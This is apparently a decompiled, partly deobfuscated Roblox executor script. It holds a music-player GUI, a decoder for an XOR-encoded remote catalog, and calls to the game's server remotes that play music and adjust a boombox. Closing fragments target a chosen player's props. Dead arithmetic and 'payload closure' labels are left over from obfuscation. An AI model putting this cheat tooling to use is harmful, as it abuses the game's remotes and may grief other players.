            marker.Parent = row
            local markerCorner = Instance.new("UICorner")
            markerCorner.CornerRadius = UDim.new(1, 0)
            markerCorner.Parent = marker
        else
            attachHover(row, baseColor, THEME.surfaceHi)
        end

        row.MouseButton1Click:Connect(function()
            selectedIndex = i
            selectMusic(music, true)
            rebuildList()
        end)
    end

    list.CanvasSize = UDim2.new(0, 0, 0, #filtered * (ROW_HEIGHT + 5) + 14)
    if #filtered == 0 then
        notify("Nenhuma musica encontrada", THEME.warn)
    else
        notify(tostring(#filtered) .. " musicas")
    end
end

local function countSongs(optionName)
    if optionName == "Favoritas" then
        return #favorites
    end
    for _, category in ipairs(categories) do
        if category.name == optionName then
            return #(category.songs or {})
        end
    end
    return 0
end

local function closeDropdown()
    if not dropdown.Visible then return end
    categoryIcon.Image = ICON_CHEVRON_DOWN
    safeTween(dropdown, { Size = UDim2.new(1, 0, 0, 0) }, 0.12)
    task.delay(0.13, function()
        if dropdown and dropdown.Parent then
            dropdown.Visible = false
        end
    end)
end

local function rebuildDropdown()
    for _, child in ipairs(dropdown:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    local options = { "Favoritas" }
    for _, category in ipairs(categories) do
        table.insert(options, category.name)
    end
    for index, option in ipairs(options) do
        local isCurrent = option == currentCategory

        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, 0, 0, CATEGORY_ROW_HEIGHT)
        button.LayoutOrder = index
        button.BackgroundColor3 = isCurrent and THEME.surfaceHi or THEME.surface
        button.BackgroundTransparency = isCurrent and 0 or 1
        button.BorderSizePixel = 0
        button.Text = ""
        button.AutoButtonColor = false
        button.ZIndex = 21
        button.Parent = dropdown
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 9)
        corner.Parent = button

        -- Marcador branco na lateral no lugar do antigo chevron a direita
        local marker = Instance.new("Frame")
        marker.Size = UDim2.new(0, 3, 0, math.floor(CATEGORY_ROW_HEIGHT * 0.45))
        marker.Position = UDim2.new(0, 8, 0.5, 0)
        marker.AnchorPoint = Vector2.new(0, 0.5)
        marker.BackgroundColor3 = THEME.accent
        marker.BackgroundTransparency = isCurrent and 0 or 1
        marker.BorderSizePixel = 0
        marker.ZIndex = 22
        marker.Parent = button
        local markerCorner = Instance.new("UICorner")
        markerCorner.CornerRadius = UDim.new(1, 0)
        markerCorner.Parent = marker

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -62, 1, 0)
        label.Position = UDim2.new(0, 19, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = option
        label.TextColor3 = isCurrent and THEME.text or THEME.textDim
        label.Font = isCurrent and Enum.Font.GothamBold or Enum.Font.GothamMedium
        label.TextSize = isCompactScreen and 14 or 13
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextTruncate = Enum.TextTruncate.AtEnd
        label.ZIndex = 22
        label.Parent = button

        local count = Instance.new("TextLabel")
        count.Size = UDim2.new(0, 36, 1, 0)
        count.Position = UDim2.new(1, -42, 0, 0)
        count.BackgroundTransparency = 1
        count.Text = tostring(countSongs(option))
        count.TextColor3 = isCurrent and THEME.accentSoft or THEME.textMute
        count.Font = Enum.Font.GothamMedium
        count.TextSize = 12
        count.TextXAlignment = Enum.TextXAlignment.Right
        count.ZIndex = 22
        count.Parent = button

        if not isCurrent then
            button.MouseEnter:Connect(function()
                safeTween(button, { BackgroundTransparency = 0 }, 0.1)
                safeTween(label, { TextColor3 = THEME.text }, 0.1)
            end)
            button.MouseLeave:Connect(function()
                safeTween(button, { BackgroundTransparency = 1 }, 0.1)
                safeTween(label, { TextColor3 = THEME.textDim }, 0.1)
            end)
        end

        button.MouseButton1Click:Connect(function()
            currentCategory = option
            categoryButton.Text = option
            saveConfig()
            closeDropdown()
            rebuildDropdown()
            rebuildList()
        end)
    end
    dropdown.CanvasSize = UDim2.new(0, 0, 0, math.max(dropLayout.AbsoluteContentSize.Y + 20, #options * (CATEGORY_ROW_HEIGHT + 4) + 20))
end

categoryButton.MouseButton1Click:Connect(function()
    if dropdown.Visible then
        closeDropdown()
        return
    end
    dropdown.Visible = true
    categoryIcon.Image = ICON_CHEVRON_UP
    local contentH = dropLayout.AbsoluteContentSize.Y + 16
    if contentH <= 16 then
        contentH = (#categories + 1) * (CATEGORY_ROW_HEIGHT + 4) + 16
    end
    local maxAllowed = getDropdownMaxHeight()
    local target = math.min(contentH, maxAllowed)
    safeTween(dropdown, { Size = UDim2.new(1, 0, 0, target) }, 0.16)
end)

-- Clicar fora fecha o dropdown
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if not dropdown.Visible then return end
    if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then
        return
    end
    local pos = input.Position
    local function inside(guiObject)
        local topLeft = guiObject.AbsolutePosition
        local size = guiObject.AbsoluteSize
        return pos.X >= topLeft.X and pos.X <= topLeft.X + size.X
            and pos.Y >= topLeft.Y and pos.Y <= topLeft.Y + size.Y
    end
    if not inside(dropdown) and not inside(categoryButton) then
        closeDropdown()
    end
end)

searchBox:GetPropertyChangedSignal("Text"):Connect(function()
    currentSearch = searchBox.Text
    rebuildList()
end)

local function playCustomId()
    local rawId = trim(customIdBox.Text)
    if rawId == "" then
        notify("Digite o ID da musica primeiro", THEME.warn)
        return
    end
    local cleanId = cleanMusicId(rawId)
    if cleanId == "" then
        notify("ID invalido", THEME.warn)
        return
    end
    local musicName = trim(customNameBox.Text)
    if musicName == "" then
        musicName = trim(searchBox.Text)
    end
    if musicName == "" then
        musicName = "ID: " .. cleanId
    end
    selectMusic({ name = musicName, id = cleanId, category = "Favoritas" }, true)
end

local function saveCustomId()
    local rawId = trim(customIdBox.Text)
    if rawId == "" then
        notify("Digite o ID da musica para salvar", THEME.warn)
        return
    end
    local cleanId = cleanMusicId(rawId)
    if cleanId == "" then
        notify("ID invalido", THEME.warn)
        return
    end
    local musicName = trim(customNameBox.Text)
    if musicName == "" then
        musicName = trim(searchBox.Text)
    end
    if musicName == "" then
        musicName = "ID: " .. cleanId
    end

    local customMusic = { name = musicName, id = cleanId, category = "Favoritas" }
    local ok, statusMsg = addOrUpdateFavorite(customMusic)

    if statusMsg == "atualizado" then
        notify("ID " .. cleanId .. " atualizado (" .. musicName .. ")", THEME.good)
    else
        notify("ID " .. cleanId .. " (" .. musicName .. ") salvo!", THEME.good)
    end

    if selectedMusic and cleanMusicId(selectedMusic.id) == cleanId then
        favButton.Text = "Remover"
    end

    rebuildDropdown()
    if currentCategory == "Favoritas" then
        rebuildList()
    end
end

customPlayBtn.MouseButton1Click:Connect(playCustomId)
customSaveBtn.MouseButton1Click:Connect(saveCustomId)
customIdBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        playCustomId()
    end
end)

playButton.MouseButton1Click:Connect(function()
    if selectedMusic then
        tocarMusica(selectedMusic.id)
        notify("Tocando: " .. selectedMusic.name, THEME.good)
    else
        notify("Selecione uma musica primeiro", THEME.warn)
    end
end)

stopButton.MouseButton1Click:Connect(function()
    tocarMusica("")
    notify("Musica parada", THEME.warn)
end)

favButton.MouseButton1Click:Connect(function()
    if not selectedMusic then
        notify("Nada selecionado", THEME.warn)
        return
    end
    if isFavorite(selectedMusic.id) then
        removeFavorite(selectedMusic.id)
        favButton.Text = "Favoritar"
        notify("Removida dos favoritos")
    else
        addFavorite(selectedMusic)
        favButton.Text = "Remover"
        notify("Salva nos favoritos", THEME.good)
    end
    if currentCategory == "Favoritas" then
        rebuildList()
    end
end)

local function jump(delta)
    if #filtered == 0 then
        notify("Nao existe musica nesta lista", THEME.warn)
        return
    end
    local index = selectedIndex
    if index == 0 and selectedMusic then
        for i, item in ipairs(filtered) do
            if tostring(item.id) == tostring(selectedMusic.id) then
                index = i
                break
            end
        end
    end
    if index == 0 then
        index = delta > 0 and 0 or #filtered + 1
    end
    local nextIndex = index + delta
    if nextIndex < 1 then
        notify("Nao existe musica antes", THEME.warn)
        return
    end
    if nextIndex > #filtered then
        notify("Nao existe mais musicas adiante", THEME.warn)
        return
    end
    selectedIndex = nextIndex
    selectMusic(filtered[nextIndex], true)
    rebuildList()
end

local keepMainOnScreen

prevButton.MouseButton1Click:Connect(function() jump(-1) end)
nextButton.MouseButton1Click:Connect(function() jump(1) end)
miniPrevButton.MouseButton1Click:Connect(function() jump(-1) end)
miniOpenButton.MouseButton1Click:Connect(function()
    minimized = false
    header.Visible = true
    body.Visible = true
    miniControls.Visible = false
    miniDragHandle.Visible = false
    resizeGrip.Visible = true
    minimizeButton.Text = "-"
    safeTween(main, { Size = UDim2.new(0, UI_WIDTH, 0, UI_HEIGHT) }, 0.18)
    task.delay(0.2, keepMainOnScreen)
end)
miniNextButton.MouseButton1Click:Connect(function() jump(1) end)

minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    header.Visible = not minimized
    body.Visible = not minimized
    miniControls.Visible = minimized
    miniDragHandle.Visible = minimized
    resizeGrip.Visible = not minimized
    minimizeButton.Text = minimized and "+" or "-"
    safeTween(main,
        { Size = minimized and UDim2.new(0, MINI_WIDTH, 0, MINI_HEIGHT) or UDim2.new(0, UI_WIDTH, 0, UI_HEIGHT) }, 0.18)
    task.delay(0.2, keepMainOnScreen)
end)

local lastMiniClick = 0
miniControls.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        local now = os.clock()
        if now - lastMiniClick < 0.35 then
            minimized = false
            header.Visible = true
            body.Visible = true
            miniControls.Visible = false
            miniDragHandle.Visible = false
            resizeGrip.Visible = true
            minimizeButton.Text = "-"
            safeTween(main, { Size = UDim2.new(0, UI_WIDTH, 0, UI_HEIGHT) }, 0.18)
            task.delay(0.2, keepMainOnScreen)
        end
        lastMiniClick = now
    end
end)

closeButton.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

keepMainOnScreen = function()
    local camera = workspace.CurrentCamera
    local screenSize = camera and camera.ViewportSize or viewport
    local size = main.AbsoluteSize
    if size.X <= 0 or size.Y <= 0 then
        return
    end

    local paddingSize = isCompactScreen and 6 or 10
    local centerX = main.AbsolutePosition.X + size.X * 0.5
    local centerY = main.AbsolutePosition.Y + size.Y * 0.5
    local minX = size.X * 0.5 + paddingSize
    local maxX = screenSize.X - size.X * 0.5 - paddingSize
    local minY = size.Y * 0.5 + paddingSize
    local maxY = screenSize.Y - size.Y * 0.5 - paddingSize

    if maxX < minX then
        centerX = screenSize.X * 0.5
    else
        centerX = math.clamp(centerX, minX, maxX)
    end
    if maxY < minY then
        centerY = screenSize.Y * 0.5
    else
        centerY = math.clamp(centerY, minY, maxY)
    end

    main.Position = UDim2.fromOffset(centerX, centerY)
end

local dragState = {
    dragging = false,
    dragInput = nil,
    dragStart = nil,
    startPos = nil,
    resizing = false,
    resizeStartPos = nil,
    startW = UI_WIDTH,
    startH = UI_HEIGHT,
}

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragState.dragging = true
        dragState.dragStart = input.Position
        dragState.startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragState.dragging = false
                keepMainOnScreen()
            end
        end)
    end
end)

header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragState.dragInput = input
    end
end)

miniControls.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragState.dragging = true
        dragState.dragStart = input.Position
        dragState.startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragState.dragging = false
                keepMainOnScreen()
            end
        end)
    end
end)

miniControls.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragState.dragInput = input
    end
end)

miniDragHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragState.dragging = true
        dragState.dragStart = input.Position
        dragState.startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragState.dragging = false
                keepMainOnScreen()
            end
        end)
    end
end)

miniDragHandle.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragState.dragInput = input
    end
end)

resizeGrip.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragState.resizing = true
        dragState.resizeStartPos = input.Position
        dragState.startW = UI_WIDTH
        dragState.startH = UI_HEIGHT

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                if dragState.resizing then
                    dragState.resizing = false
                    saveConfig()
                    keepMainOnScreen()
                end
            end
        end)
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragState.dragging and input == dragState.dragInput then
        local delta = input.Position - dragState.dragStart
        main.Position = UDim2.new(dragState.startPos.X.Scale, dragState.startPos.X.Offset + delta.X,
            dragState.startPos.Y.Scale, dragState.startPos.Y.Offset + delta.Y)
        keepMainOnScreen()
    elseif dragState.resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragState.resizeStartPos
        local scale = mainScale.Scale > 0 and mainScale.Scale or 1
        local newW = dragState.startW + (delta.X / scale)
        local newH = dragState.startH + (delta.Y / scale)
        applyWindowSize(newW, newH)
    end
end)

if workspace.CurrentCamera then
    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(keepMainOnScreen)
end

loadConfig()
loadFavorites()
if savedConfig.width and type(savedConfig.width) == "number" then
    UI_WIDTH = math.clamp(math.floor(savedConfig.width), MIN_WIDTH, MAX_WIDTH)
end
if savedConfig.height and type(savedConfig.height) == "number" then
    UI_HEIGHT = math.clamp(math.floor(savedConfig.height), MIN_HEIGHT, MAX_HEIGHT)
end
applyWindowSize(UI_WIDTH, UI_HEIGHT)

local ok, message = loadRemoteCatalog()
chooseInitialCategory()
categoryButton.Text = currentCategory
notify(message, ok and THEME.good or THEME.warn)
rebuildDropdown()
rebuildList()

]])

	if not chunk then
		warn("Erro ao abrir o player online: " .. tostring(v))
		return
	end
	local ok2, result2 = pcall(chunk)

	if not ok2 then
		warn("Erro ao executar o player online: " .. tostring(result2))
	end
end

-- payload closure created 577-th (proto #399)
local function payload_fn_577()
	local n2 = 3247294685
	local n3 = 9117016740
	local HttpService = game:GetService("HttpService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local coquetteMusicApiUrl = _G.CoquetteMusicApiUrl
	local n4 = 514641432
	local str = coquetteMusicApiUrl or "https://music.coquette-hub.com/api/catalog"
	local tbl = nil
	local tbl2 = {}
	local v = nil
	local v2 = n2

	local function fn(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	local function fn2(arg)
		local str2 = fn(arg):gsub("%s+", "")
		return str2:match("(%d+)") or str2
	end

	local function fn3(arg, arg2)
		if type(readfile) == "function" then
			local ok2, result2 = pcall(readfile, arg2)
			if ok2 and type(result2) == "string" and result2 ~= "" then
				return result2
			end
		end

		return nil
	end

	local function fn4(arg, arg2)
		if type(writefile) == "function" then
			return pcall(writefile, arg, arg2)
		end
		return false
	end

	local function fn5(arg)
		local flag = type(200684222) ~= "number"
		local v3 = fn2(arg)
		local re = ReplicatedStorage:WaitForChild("RE")
		local n5 = 398665632

		pcall(function()
			re:WaitForChild("PlayerToolEvent"):FireServer("ToolMusicText", v3)
		end)

		pcall(function()
			re:WaitForChild("1Player1sHous1e"):FireServer("PickHouseMusicText", v3)
		end)

		pcall(function()
			re:WaitForChild("1Player1sCa1r"):FireServer("VehicleMusicPlay", v3)
		end)

		pcall(function()
			re:WaitForChild("1NoMoto1rVehicle1s"):FireServer("PickingScooterMusicText", v3)
		end)
	end

	local function fn6(arg)
		local n5 = 91

		for i = 1, #arg do
			n5 = (n5 + string.byte(arg, i) * ((i - 1) % 17 + 1)) % 256
		end

		return n5
	end

	local tbl3 = {}

	for i = 1, 64 do
		tbl3[("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(i, i)] = i - 1
	end

	local function fn7(arg)
		local str2 = tostring(arg or ""):gsub("%s", "")
		local tbl4 = {}
		local n5 = 1

		for i = 1, #str2, 4 do
			local n6 = tbl3[str2:sub(i, i)] or 0
			local n7 = tbl3[str2:sub(i + 1, i + 1)] or 0
			local str3 = str2:sub(i + 2, i + 2)
			local str4 = str2:sub(i + 3, i + 3)
			local n8 = n6 * 262144 + n7 * 4096 + (tbl3[str3] or 0) * 64 + (tbl3[str4] or 0)
			tbl4[n5] = string.char(math.floor(n8 / 65536) % 256)
			n5 += 1

			if str3 ~= "=" and str3 ~= "" then
				tbl4[n5] = string.char(math.floor(n8 / 256) % 256)
				n5 += 1
			end

			if str4 ~= "=" and str4 ~= "" then
				tbl4[n5] = string.char(n8 % 256)
				n5 += 1
			end
		end

		return table.concat(tbl4)
	end

	local function fn8(arg)
		local v3 = fn7(arg)
		local n5 = fn6("k-4pYg7GcMsPL2Sc-ypfB3E7SbWSg3ugPD7CrJTvzNU")
		local create = table.create and table.create(#v3) or {}

		for i = 1, #v3 do
			n5 = (n5 * 73 + 41 + i % 251) % 256
			create[i] = string.char(bit32.bxor(string.byte(v3, i), n5))
		end

		return table.concat(create)
	end

	local function fn9(arg, arg2, arg3)
		local n5 = 492780612


		local v3 = pcall
		local v4 = table.pack(bit32.band(arg, 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local v6 = bit32.band(9528 * v5[1] + bit32.lshift(bit32.band(9528 * bit32.rshift(v4[1], 16) + 1370 * v5[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(bit32.bnot(arg), 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local n6 = 279233115 + n5 + v6 + bit32.band(9528 * v8[1] + bit32.lshift(bit32.band(9528 * bit32.rshift(v7[1], 16) + 1370 * v8[1], 65535), 16), 4294967295)

		local v9, v10 = v3(function()
			return game:HttpGet(arg3, true)
		end)

		if v9 and v10 and v10 ~= "" then
			return v10
		end

		local ok2, result2 = pcall(function()
			return HttpService:GetAsync(arg3)
		end)

		if ok2 and result2 and result2 ~= "" then
			return result2
		end
		return nil
	end

	local function fn10(arg, arg2)
		local musicCatalog = upv1.get("musicCatalog", str, 8)
		local n5 = 454655332
		local v3 = musicCatalog or fn9(59151340, arg2, str)
		if not v3 then
			return nil, "Nao foi possivel carregar o catalogo do site."
		end
		local v4 = pcall
		local v5 = table.pack(bit32.band(n5, 4294967295))
		local v6 = table.pack(bit32.band(v5[1], 65535))
		local n6 = 3686629821 + bit32.band(54003 * v6[1] + bit32.lshift(bit32.band(54003 * bit32.rshift(v5[1], 16) + 9794 * v6[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(arg, 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local v9 = bit32.band(30397 * v8[1] + bit32.lshift(bit32.band(30397 * bit32.rshift(v7[1], 16) + 49291 * v8[1], 65535), 16), 4294967295)
		local v10 = table.pack(bit32.band(bit32.bnot(arg), 4294967295))
		local v11 = table.pack(bit32.band(v10[1], 65535))
		local v12 = bit32.band(30397 * v11[1] + bit32.lshift(bit32.band(30397 * bit32.rshift(v10[1], 16) + 49291 * v11[1], 65535), 16), 4294967295)
		local v13 = table.pack(bit32.band(bit32.bnot(n5), 4294967295))
		local v14 = table.pack(bit32.band(v13[1], 65535))
		local n7 = n6 + v9 + v12 + bit32.band(54002 * v14[1] + bit32.lshift(bit32.band(54002 * bit32.rshift(v13[1], 16) + 9794 * v14[1], 65535), 16), 4294967295)

		local v15, v16 = v4(function()
			return HttpService:JSONDecode(v3)
		end)

		if not v15 or type(v16) ~= "table" or type(v16.payload) ~= "string" then
			return nil, "O site retornou um catalogo invalido."
		end

		local ok2, result2 = pcall(function()
			return HttpService:JSONDecode(fn8(v16.payload))
		end)

		if not ok2 or type(result2) ~= "table" or type(result2.categories) ~= "table" then
			return nil, "Nao foi possivel abrir o catalogo do site."
		end
		return result2.categories
	end

	local function fn11(arg, arg2)
		tbl2 = {}
		local tbl4 = {}
		local v3 = fn3(arg, "CoquetteHub_Favorites.json", 518387209)

		if v3 then
			local v4 = pcall
			local v5 = table.pack(bit32.band(arg2, 4294967295))
			local v6 = table.pack(bit32.band(v5[1], 65535))
			local v7 = bit32.band(31601 * v6[1] + bit32.lshift(bit32.band(31601 * bit32.rshift(v5[1], 16) + 49337 * v6[1], 65535), 16), 4294967295)
			local v8 = table.pack(bit32.band(bit32.bnot(arg2), 4294967295))
			local v9 = table.pack(bit32.band(v8[1], 65535))
			local n5 = 3896383257 + v7 + bit32.band(31601 * v9[1] + bit32.lshift(bit32.band(31601 * bit32.rshift(v8[1], 16) + 49337 * v9[1], 65535), 16), 4294967295)

			local v10, v11 = v4(function()
				return HttpService:JSONDecode(v3)
			end)

			if v10 and type(v11) == "table" then
				for _, v12 in ipairs(v11) do
					if type(v12) == "table" and v12.id and tostring(v12.id) ~= "" then
						local id = fn2(v12.id)
						local str2 = fn(v12.name)

						if str2 == "" then
							str2 = "ID: " .. id
						end

						if id ~= "" and not tbl4[id] then
							tbl4[id] = true
							table.insert(tbl2, { id = id, name = str2, category = tostring(v12.category or "Favoritas") })
						end
					end
				end
			end
		end
	end

	local function fn12()
		local flag = type(0) == "userdata"
		local n5 = 784853996

		local ok2, result2 = pcall(function()
			return HttpService:JSONEncode(tbl2)
		end)

		if ok2 and result2 then
			fn4("CoquetteHub_Favorites.json", result2)
		end
	end

	local function fn13(arg)
		local v3 = fn2(arg)

		for i, v4 in ipairs(tbl2) do
			if fn2(v4.id) == v3 then
				return i, v4
			end
		end

		return nil
	end

	local function fn14(arg)
		local str2 = fn(arg):lower()

		for i, v3 in ipairs(tbl2) do
			if fn(v3.name):lower() == str2 then
				return i, v3
			end
		end

		return nil
	end

	local function fn15()
		local tbl4 = {}

		for _, v3 in ipairs(tbl2) do
			table.insert(tbl4, v3.name)
		end

		if #tbl4 == 0 then
			table.insert(tbl4, "Nenhuma favorita")
		end

		return tbl4
	end

	local function fn16()
		local n5 = 147957460
		if not v then
			return
		end
		local v3 = fn15()

		pcall(function()
			if v.UpdateOptions then
				v:UpdateOptions(v3)
			elseif v.SetOptions then
				v:SetOptions(v3)
			elseif v.Refresh then
				v:Refresh(v3)
			elseif v.Update then
				v:Update(v3)
			elseif v.Set then
				v:Set(v3)
			end
		end)
	end

	local function fn17(arg)
		if not arg then
			return
		end
		local id = fn2(arg.id)
		if id == "" then
			return
		end
		local str2 = fn(arg.name)

		if str2 == "" then
			str2 = "ID: " .. id
		end

		local tbl4 = { id = id, name = str2, category = tostring(arg.category or "Favoritas") }

		for i = #tbl2, 1, -1 do
			if fn2(tbl2[i].id) == id then
				table.remove(tbl2, i)
			end
		end

		table.insert(tbl2, tbl4)
		fn12()
		fn16()
	end

	local n5 = n4 - 134254043 + 210357074
	local v3 = bit32.band(n2, v2)
	fn11(346159444, 354643826)
	upv2:AddSection({ "Tocar por ID" })

	upv2:AddTextBox({
		Name = "ID da musica",
		PlaceholderText = "Digite o ID e pressione Enter",
		Callback = function(arg)
			local id = fn2(arg)

			if id ~= "" then
				tbl = { id = id, name = "ID: " .. id, category = "Manual" }
				fn5(id)
			end
		end,
	})

	upv2:AddSection({ "Catalogo 2" })
	local v4, v5 = fn10(9866320, 455145032)

	if v4 then
		for _, v6 in ipairs(v4) do
			local v7 = fn(v6.name)
			local tbl4 = {}
			local tbl5 = {}
			local tbl6 = {}
			local v8 = ipairs
			local songs = v6.songs or {}

			for _, song in v8(songs) do
				local v9 = fn(song.name)
				local v10 = fn2(song.id)

				if v9 ~= "" and v10 ~= "" then
					local str2

					if tbl6[v9] then
						str2 = v9 .. "  [" .. v10 .. "]"
					else
						str2 = v9
					end

					tbl6[str2] = true
					table.insert(tbl4, str2)
					tbl5[str2] = { id = v10, name = v9, category = v7 }
				end
			end

			if v7 ~= "" and #tbl4 > 0 then
				upv2:AddDropdown({
					Name = v7,
					Description = "Musicas da sessao " .. v7,
					Default = tbl4[1],
					Multi = false,
					Options = tbl4,
					Callback = function(arg)
						local v9 = tbl5[arg]

						if v9 then
							tbl = v9
							fn5(v9.id)
						end
					end,
				})
			end
		end
	else
		upv2:AddParagraph({ "Catalogo indisponivel", v5 })
	end

	upv2:AddSection({ "Favoritos" })
	local v6 = fn15()

	v = upv2:AddDropdown({
		Name = "Musicas favoritas",
		Description = "Musicas salvas por voce",
		Default = v6[1],
		Multi = false,
		Options = v6,
		Callback = function(arg)
			if arg and arg ~= "Nenhuma favorita" then
				local v7, v8 = fn14(arg)

				if v8 then
					tbl = v8
					fn5(v8.id)
				end
			end
		end,
	})

	upv2:AddButton({
		Name = "Favoritar musica atual",
		Description = "Salva a musica ou o ID selecionado acima",
		Callback = function()
			if tbl then
				fn17(tbl)
			end
		end,
	})

	local str2 = ""
	local str3 = ""

	upv2:AddTextBox({
		Name = "ID para favoritar manualmente",
		PlaceholderText = "Digite o ID aqui",
		Callback = function(arg)
			str2 = fn(arg)
		end,
	})

	upv2:AddTextBox({
		Name = "Nome da musica",
		PlaceholderText = "Digite o nome para aparecer nos favoritos (opcional)",
		Callback = function(arg)
			str3 = fn(arg)
		end,
	})

	upv2:AddButton({
		Name = "Favoritar ID digitado",
		Description = "Salva o ID e o nome digitados acima",
		Callback = function()
			if str2 ~= "" then
				local id = fn2(str2)

				if id ~= "" then
					fn17({ id = id, name = str3 ~= "" and str3 or "ID: " .. id, category = "Manual" })
				end
			end
		end,
	})

	local function fn18()
		if not tbl then
			return
		end
		local v7 = fn13(tbl.id)

		if v7 then
			table.remove(tbl2, v7)
			fn12()
			fn16()
		end
	end

	upv2:AddButton({
		Name = "Remover atual dos favoritos",
		Description = "Remove a musica selecionada da lista",
		Callback = fn18,
	})


	upv2:AddButton({
		Name = "Parar musica",
		Description = "Para a musica atual",
		Callback = function()
			fn5("")
		end,
	})
end

-- payload closure created 578-th (proto #t1477)
local function payload_fn_578(arg)
	return tostring(arg)
end

-- payload closure created 612-th (proto #430)
local function payload_fn_612()
	local localPlayer = game:GetService("Players").LocalPlayer
	local n2 = 243605245

	local function fn()
		local v = bit32.bxor(n2, 237962445)
		local n3 = 44954983
		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
		local backpack = localPlayer:WaitForChild("Backpack")
		local upperTorso = character:WaitForChild("UpperTorso")
		local rightHand = character:WaitForChild("RightHand")
		local boombox = backpack:FindFirstChild("Boombox") or character:FindFirstChild("Boombox")
		if not (boombox and boombox:IsA("Tool") and upperTorso and rightHand) then
			warn("Boombox não encontrada ou partes do corpo ausentes!")
			return
		end
		boombox.Parent = backpack
		task.wait(0.1)
		boombox.Parent = character
		task.wait(0.5)
		local rightGripAttachment = rightHand:FindFirstChild("RightGripAttachment")
		local cFrame

		if rightGripAttachment then
			n3 = n3 - 509818975 - 3785148321
			cFrame = rightGripAttachment.CFrame
		else
			cFrame = rightGripAttachment
		end

		local n4 = rightHand.CFrame * (cFrame or CFrame.new(0, -0.83, 0))
		local n5 = upperTorso.Size / Vector3.new(2, 1.6, 1)
		local n6 = 0.1 * n5.Y
		local n7 = 0.65 * n5.Z
		local cframe = CFrame.Angles(-0.17453292519943295, 0, 0.17453292519943295)
		boombox.Grip = (upperTorso.CFrame * CFrame.new(0, n6, n7) * cframe):Inverse() * n4
	end

	fn(7076699, 501256986)
end

-- payload closure created 614-th (proto #432)
local function payload_fn_614(arg)
	if not arg or arg == "" or arg == "Nenhum jogador" then
		upv1 = nil
		return
	end
	upv1 = upv2:FindFirstChild(arg)
end

-- payload closure created 615-th (proto #433)
local function payload_fn_615()
	local tbl = { "Nenhum jogador" }

	for _, player in ipairs(upv1:GetPlayers()) do
		table.insert(tbl, player.Name)
	end

	if upv2 and upv2.Set then
		upv2:Set(tbl)
	end
end

-- payload closure created 616-th (proto #434)
local function payload_fn_616()
	upv1()
end

-- payload closure created 617-th (proto #766)
local function payload_fn_617()
	if upv1 and not upv1.Parent then
		upv1 = nil
	end
end

-- payload closure created 618-th (proto #437)
local function payload_fn_618(arg)
	local name = arg.Name
	return name:find("Prop" .. upv1.Name) or name:find(upv1.Name)
end

-- payload closure created 619-th (proto #438)
local function payload_fn_619(arg)
	if not arg:FindFirstChild("SetCurrentCFrame") then
		return
	end

	for _, v in ipairs(upv1) do
		if v == arg then
			return
		end
	end

	table.insert(upv1, arg)
end

-- payload closure created 620-th (proto #436)
local function payload_fn_620()
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	if not workspaceCom then
		return
	end

	for _, child in ipairs(workspaceCom:GetChildren()) do
		if child:IsA("Folder") or child:IsA("Model") then
			for _, child2 in ipairs(child:GetChildren()) do
				if upv1(child2) then
					upv2(child2)
				end
			end
		end
	end
end

-- payload closure created 621-th (proto #439)
local function payload_fn_621()
	local workspaceCom = workspace:FindFirstChild("WorkspaceCom")
	local n2 = 161711543
	if not workspaceCom then
		return
	end
	local n3 = n2 + 306896434

	local connection = workspaceCom.ChildAdded:Connect(function(child)
		task.wait(0.1)

		if child:IsA("Folder") or child:IsA("Model") then
			local n4 = 643720794

			local connection = child.ChildAdded:Connect(function(child2)
				task.wait(0.1)

				if upv1(child2) and upv2 then
					upv3(child2)
				end
			end)

			table.insert(upv4, connection)

			for _, child2 in ipairs(child:GetChildren()) do
				if upv1(child2) and upv2 then
					upv3(child2)
				end
